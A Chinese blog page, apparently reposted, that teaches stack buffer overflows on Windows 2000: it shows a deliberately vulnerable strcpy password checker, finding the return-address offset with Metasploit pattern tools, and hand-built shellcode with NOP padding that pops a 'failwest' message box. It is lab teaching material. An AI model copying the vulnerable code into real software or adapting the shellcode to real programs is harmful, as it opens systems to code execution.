@@ -1,0 +1,847 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ysc">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。 1. 栈溢出原理1.1 修改邻接变量的原理用实例来反映原理  #include &lt;stdio.h&gt; #include &lt;string.h&gt;  #define PASSWORD &quot;1234567&quot;  i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出原理与实践">
+<meta property="og:url" content="https://ysc2.github.io/ysc2.github.io/2023/11/09/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/index.html">
+<meta property="og:site_name" content="Ysc Web">
+<meta property="og:description" content="声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。 1. 栈溢出原理1.1 修改邻接变量的原理用实例来反映原理  #include &lt;stdio.h&gt; #include &lt;string.h&gt;  #define PASSWORD &quot;1234567&quot;  i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/404.jpg">
+<meta property="article:published_time" content="2023-11-09T05:15:04.000Z">
+<meta property="article:modified_time" content="2023-11-09T07:17:27.737Z">
+<meta property="article:author" content="Ysc">
+<meta property="article:tag" content="转载">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/404.jpg">
+  
+  
+  
+  <title>栈溢出原理与实践 - Ysc Web</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ysc2.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"c"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ysc博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/404.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="栈溢出原理与实践"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-09 13:15" pubdate>
+          2023年11月9日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">栈溢出原理与实践</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><b>声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。</b></p>
+<h3 id="1-栈溢出原理"><a href="#1-栈溢出原理" class="headerlink" title="1. 栈溢出原理"></a>1. 栈溢出原理</h3><h4 id="1-1-修改邻接变量的原理"><a href="#1-1-修改邻接变量的原理" class="headerlink" title="1.1 修改邻接变量的原理"></a>1.1 修改邻接变量的原理</h4><p>用实例来反映原理</p>
+<pre><code class="hljs">
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define PASSWORD "1234567"
+
+int verify_password(char *password)
+&#123;
+    int authenticated;
+    char buffer[8];
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);
+    return authenticated;
+&#125;
+
+void main()
+&#123;
+    int valid_flag = 0;
+    char password[1024];
+    while(1)
+    &#123;
+        printf("please input password:        ");
+        scanf("%s", password);
+        valid_flag = verify_password(password);
+        if (valid_flag)
+        &#123;
+            printf("incorrect password!\n\n");
+        &#125;
+        else
+        &#123;
+            printf("Congratulations! You have passed the verification!\n");
+            break;
+        &#125;
+    &#125;
+&#125;
+
+</code></pre>
+
+<p>于是栈帧布局为：<br><img src="/images/2017-06-22/stack_layout.png" srcset="/img/loading.gif" lazyload alt="栈帧布局"></p>
+<p>因此，当你输入7位正确密码（”1234567”）或者输入8字节其他字符串（比原始字符串要大），都能通过验证。authenticated是int类型，在内存中是DWORD，占4个字节。所以当输入8位后，数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p>
+<p><font color=#f00>win32系统中数据是由低位向高位存储一个4字节的双字（DWORD），但作为数值应用时，却是按照由高位字节向低位字节进行解释。</font></p>
+<p>如果输入的是1234567，那么结果为：<br>34 33 32 31<br>00 37 36 35<br>一定要注意window字节顺序</p>
+<h4 id="1-2-修改函数返回地址"><a href="#1-2-修改函数返回地址" class="headerlink" title="1.2 修改函数返回地址"></a>1.2 修改函数返回地址</h4><p>通过覆盖返回地址，我们可以跳转到我们想到达的位置</p>
+<p><b>问题1：如何修改返回地址，并准确的判定返回地址所在位置？</b></p>
+<p><font color=#0f0>在函数返回的”retn”指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个地址弹入EIP寄存器中，之后跳转到这个地址去执行。栈顶是OllyDbg右侧ESP标灰的那个</font></p>
+<p>所以常见的解决办法是：<br>（1）输入一个较长的字符串，最好这个字符串有一定规律【这里可以使用&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_create.rb来创建一定长度的指令】，然后查看返回地址所指向的位置，看看是刚才所指定的字符串的哪个位置【这里可以使用&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_offset.rb 来查看字符串出现的地址】<br>（2）本机实验时，offset位置为16（此处的16指的是起始位置），因此如果想要对该程序的返回地址进行修改的话，就应该是<br>               <font color=#f00>‘a’*16+返回地址</font><font color=#0f0>（返回地址得逆序编写）</font></p>
+<p><b>问题2：如何控制程序执行流程？</b></p>
+<p>上面已经讲了如何修改返回地址，所以如果在进入某个子函数之后，有栈溢出，就可以修改相应的返回地址，让其能够跳转至想让其执行代码的位置，这样就能控制流程；</p>
+<p>另外一种十分简单的办法就是直接修改PE文件，修改分支指令，这样也可以控制程序执行流程！</p>
+<h3 id="2-代码植入"><a href="#2-代码植入" class="headerlink" title="2. 代码植入"></a>2. 代码植入</h3><h4 id="2-1-测试代码"><a href="#2-1-测试代码" class="headerlink" title="2.1 测试代码"></a>2.1 测试代码</h4><pre><code class="hljs">
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+#define PASSWORD "1234567"
+
+int verify_password(char *password)
+&#123;
+    int authenticated;
+    char buffer[44];        //add local buff to be overflowed
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);    //overflowed here!
+    return authenticated;
+&#125;
+
+void main()
+&#123;
+    int valid_flag = 0;
+    char password[1024];
+    FILE *fp;
+    LoadLibrary("user32.dll");    //prepare for messagebox
+    if (!(fp=fopen("password.txt","rw+")))
+    &#123;
+        exit(0);
+    &#125;
+    //MessageBoxA(0,"123","123",0);
+    fscanf(fp, "%s", password);
+    valid_flag = verify_password(password);
+    if(valid_flag)
+    &#123;
+        printf("incorrect password!\n\n");
+    &#125;
+    else
+    &#123;
+        printf("Congratulations! You have passed the verification!\n\n");
+    &#125;
+    fclose(fp);
+&#125;
+</code></pre>
+
+<p><font color=#dd0>其中头文件windows.h，是方便程序能够顺利调用LoadLibrary函数去装载user32.dll<br>verify_password函数的局部变量buffer由8个字节增加到44字节，这样做是为了有足够的空间来“承载”我们植入的代码。<br>main函数中增加了LoadLibrary(“user32.dll”)用于初始化装载user32.dll，以便在植入代码中调用MessageBox。<br></font></p>
+<p><b>需要完成的工作：</b></p>
+<ol>
+<li>分析并调试漏洞程序，获得淹没返回地址的偏移</li>
+<li>获得buffer的起始地址，并将其写入password.txt的相应偏移，用来冲刷返回地址</li>
+<li>向password.txt中写入可执行的机器代码，用来调用API弹出一个消息框。</li>
+</ol>
+<p><font color=#f00>通过调试可以获得buffer数组的起始地址0x0012FAF0，以及password.txt文件中第53~56个字符的ASCII码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址</font></p>
+<p>MSDN对该函数的解释如下：</p>
+<pre><code class="hljs">
+int WINAPI MessageBox(
+  _In_opt_ HWND    hWnd,		//handle to owner window
+  _In_opt_ LPCTSTR lpText,		//text in message box
+  _In_opt_ LPCTSTR lpCaption,	//messagebox title
+  _In_     UINT    uType		//Messagebox style
+);
+</code></pre>
+
+<ul>
+<li>hWnd[in] 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口</li>
+<li>IpText[in]  字符串指针，所指字符串会在消息框中显示</li>
+<li>IpCaption[in]  字符串指针，所指字符串将成为消息框的标题</li>
+<li>uType[in]  消息框的风格（单按钮、多按钮等），NULL代表默认风格</li>
+</ul>
+<p>熟悉MFC的程序员都知道，系统其实并不存在真正的MessageBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数（ASCII）或者“W”类型函数（UNICODE）调用。因此，本文中用的是MessageBoxA。</p>
+<p><b>用汇编语言调用MessageBoxA需要三个步骤</b></p>
+<ol>
+<li>装载动态链接库user32.dll。MessageBoxA是动态链接库user32.dll的导出函数。虽然大多数有图形界面的程序都已经装载了该库，但是本实验的Console程序并没有默认加载。</li>
+<li>在汇编语言中调用该函数需要获得这个函数的入口地址</li>
+<li>在调用前需要向栈中从右向左的顺序压入MessageBoxA的4个参数</li>
+</ol>
+<p><font color=#f00>获取MessageBoxA的方式，我们在《查找动态链接库的API地址》那一篇博文中有讲，这里仅仅给出Windows 2000 Server的MessageBoxA地址为0x77E16544.</font></p>
+<p>下面将让弹出的窗口显示标题和文本内容都为“failwest”，而压入的第一个和第四个参数都为NULL。</p>
+<p><b><center>机器代码(具体操作可以参见《机器代码与汇编代码的转换》)</center></b></p>
+<table>
+<thead>
+<tr>
+<th>机器代码（十六进制）</th>
+<th>汇编指令</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>33DB</td>
+<td>XOR EBX, EBX</td>
+<td></td>
+</tr>
+<tr>
+<td>53</td>
+<td>PUSH EBX</td>
+<td></td>
+</tr>
+<tr>
+<td>6877657374</td>
+<td>PUSH 74736577</td>
+<td></td>
+</tr>
+<tr>
+<td>6877657374</td>
+<td>PUSH 74736577</td>
+<td>压入NULL结尾的”failwest”字符串。之所以使用EBX清零后作为字符串的截断符，是为了避免”PUSH 0”中的NULL，否则植入的机器码会被strcpy函数截断</td>
+</tr>
+<tr>
+<td>8BC4</td>
+<td>MOV EAX, ESP</td>
+<td>EAX里是字符串指针</td>
+</tr>
+<tr>
+<td>53</td>
+<td>PUSH EBX</td>
+<td></td>
+</tr>
+<tr>
+<td>50</td>
+<td>PUSH EAX</td>
+<td></td>
+</tr>
+<tr>
+<td>50</td>
+<td>PUSH EAX</td>
+<td></td>
+</tr>
+<tr>
+<td>53</td>
+<td>PUSH EBX</td>
+<td>4个参数按照从右向左的顺序入栈，分别是(0,failwest,failwest,0)<br></td>
+</tr>
+<tr>
+<td>消息框是默认风格，文本区和标题都是”failwest”</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>B84465E177</td>
+<td>MOV EAX, 0x77E16544</td>
+<td></td>
+</tr>
+<tr>
+<td>FFD0</td>
+<td>CALL EAX</td>
+<td>调用函数MessageBoxA。这里的地址依据机器而定</td>
+</tr>
+</tbody></table>
+<p>然后在这些代码与53—56处的buffer中0x0012FAF0(返回地址)，其余的字节用0x90(nop指令)填充。</p>
+<p>shellcode[] &#x3D; “\x33\xdb\x53\x68\x77\x65\x73\x74\x68\x77\x65\x73\x74<br>\x8b\xc4\x53\x50\x50\x53\xb8\x44\x65\xe1\x77\xff\xd0\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf0\xfa\x12\x00”</p>
+<p><img src="/images/2017-06-22/failwest_test.jpg" srcset="/img/loading.gif" lazyload alt="测试结果"></p>
+<h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a target="_blank" rel="noopener" href="https://introspelliam.github.io/">本文章装载于此</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AE%89%E5%85%A8/" class="category-chain-item">安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%BD%AC%E8%BD%BD/" class="print-no-link">#转载</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>栈溢出原理与实践</div>
+      <div>https://ysc2.github.io/ysc2.github.io/2023/11/09/栈溢出原理与实践/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ysc</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%945/" title="malloc源码分析——5">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">malloc源码分析——5</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/09/%E6%A0%88%E7%9A%84%E4%BB%8B%E7%BB%8D/" title="栈的介绍">
+                        <span class="hidden-mobile">栈的介绍</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
